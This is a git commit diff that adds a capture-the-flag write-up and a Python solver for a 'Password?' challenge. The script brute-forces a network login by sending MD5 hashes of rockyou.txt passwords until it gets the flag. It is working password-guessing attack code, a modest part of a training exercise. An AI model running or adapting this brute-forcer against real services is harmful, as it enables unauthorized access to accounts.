82b052ae190c294b32e64770c623c293952e097e
Zion Perez <zionperez@gmail.com>
2020-06-01 20:01:31 -0600

    Add solution for Password? challenge.

--- Miscellaneous/Password/README.md
+++ Miscellaneous/Password/README.md
@@ -9,7 +9,7 @@ I found another service that looks similar to the last, but this one asks for a 
 challenges.laptophackingcoffee.org:3345
 
 ## Solution
-Connect via netcat. Try entering a few passwords:
+Connect via netcat. Enter a few passwords:
 ```
 $ nc challenges.laptophackingcoffee.org 3345
 Please enter your password: password
@@ -19,4 +19,23 @@ Incorrect password.
 Please enter your password: 
 ```
 
-Is this a bruteforce?
+Is this a brute force challenge? Yes. 
+
+Draft up a script that will automatically send password hashes to this challenge. Use the [rockyou](../../Tools/rockyou.txt) password list given in the rules. 
+
+When using netcat, a newline character `\n` is sent at the end of the user's input string. The server receives this and truncates the last character of the input. When sending data with python, an extra byte needs to be tacked onto the end so that the server can truncate this extra byte. In the script, an extra `0` is added:
+```
+pwHash = hashlib.md5(password.encode('utf-8')).hexdigest() + "0"
+```
+
+This is the full script: [script.py](script.py). Run the script and wait for the flag:
+```
+$ python3 script.py challenges.laptophackingcoffee.org 3345
+...
+Trying: [isaiah]
+Trying: [christmas]
+Trying: [cesar]
+Trying: [lolipop]
+Password: lolipop
+Response:  LHC{7cP8rU73d}
+```
--- Miscellaneous/Password/script.py
+++ Miscellaneous/Password/script.py
@@ -1,6 +1,50 @@
 #!/bin/python3
 
-from pwn import *
+import argparse
+import socket
+import hashlib
 
-conn = remote('challenges.laptophackingcoffee.org', 3345)
-conn.recvline()
+def receiveUntil(sock, ending=":"):
+    data = ""    
+    while True:
+        chunk = sock.recv(1).decode()
+        data += chunk        
+        if chunk in ending:
+            return data
+        if len(data) > 100:
+            return data
+            
+
+# 'argparse' is a very useful library for building python tools that are easy
+# to use from the command line.  It greatly simplifies the input validation
+# and "usage" prompts which really help when trying to debug your own code.
+parser = argparse.ArgumentParser(description="Solver for 'All Your Base' challenge")
+parser.add_argument("ip", help="IP (or hostname) of remote instance")
+parser.add_argument("port", type=int, help="port for remote instance")
+args = parser.parse_args()
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((args.ip, args.port))
+
+passwordsList = "../../Tools/rockyou.txt"
+with open(passwordsList, 'r') as handle:
+    for line in handle:
+        # Receive prompt
+        prompt = receiveUntil(sock, ":")        
+        
+        # Send hashed password
+        password = line.strip()
+        print(f"Trying: [{password}]")
+        # Add + "0" because the last character gets stripped on the server side
+        # The server is stripping the implied newline character "\n"
+        pwHash = hashlib.md5(password.encode('utf-8')).hexdigest() + "0"
+        sock.send(pwHash.encode())
+
+        # Receive response    
+        response = receiveUntil(sock, ".}")
+        if "Incorrect password" in response:
+            continue
+        else:
+            print(f"Password: {password}")
+            print(f"Response: {response}")
+            break
